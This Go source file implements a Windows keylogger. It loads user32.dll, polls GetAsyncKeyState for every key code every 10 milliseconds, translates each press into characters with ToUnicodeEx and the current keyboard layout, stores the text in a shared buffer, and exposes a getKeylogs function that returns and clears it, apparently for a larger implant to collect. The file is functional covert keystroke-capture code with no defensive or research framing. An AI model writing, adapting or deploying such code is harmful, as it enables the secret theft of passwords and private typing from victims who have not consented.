package main

import (
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	user32                = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState  = user32.NewProc("GetAsyncKeyState")
	procGetKeyboardState  = user32.NewProc("GetKeyboardState")
	procToUnicodeEx       = user32.NewProc("ToUnicodeEx")
	procGetKeyboardLayout = user32.NewProc("GetKeyboardLayout")
)

var (
	keylogBuffer strings.Builder
	keylogMutex  sync.Mutex
)

// Poll key state
func startKeylogger() {
	var state [256]byte
	for {
		for i := 8; i < 256; i++ {
			v, _, _ := procGetAsyncKeyState.Call(uintptr(i))
			if v&0x8000 != 0 {
				if state[i] == 0 {
					state[i] = 1
					handleKey(i)
				}
			} else {
				state[i] = 0
			}
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func handleKey(vkCode int) {
	keylogMutex.Lock()
	defer keylogMutex.Unlock()

	switch vkCode {
	case 0x08:
		keylogBuffer.WriteString("[BACKSPACE]")
		return
	case 0x0D:
		keylogBuffer.WriteString("\n")
		return
	case 0x09:
		keylogBuffer.WriteString("[TAB]")
		return
	case 0x10, 0xA0, 0xA1:
		return
	case 0x11, 0xA2, 0xA3:
		return
	case 0x12, 0xA4, 0xA5:
		return
	case 0x14:
		return
	case 0x20:
		keylogBuffer.WriteString(" ")
		return
	case 0x2E:
		keylogBuffer.WriteString("[DEL]")
		return
	}

	var keyboardState [256]byte
	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyboardState[0])))

	var buf [2]uint16
	kl, _, _ := procGetKeyboardLayout.Call(0)

	ret, _, _ := procToUnicodeEx.Call(
		uintptr(vkCode),
		uintptr(0),
		uintptr(unsafe.Pointer(&keyboardState[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(2),
		uintptr(0),
		kl,
	)

	if ret > 0 {
		keylogBuffer.WriteString(syscall.UTF16ToString(buf[:ret]))
	}
}

func getKeylogs() string {
	keylogMutex.Lock()
	defer keylogMutex.Unlock()
	logs := keylogBuffer.String()
	keylogBuffer.Reset()
	return logs
}
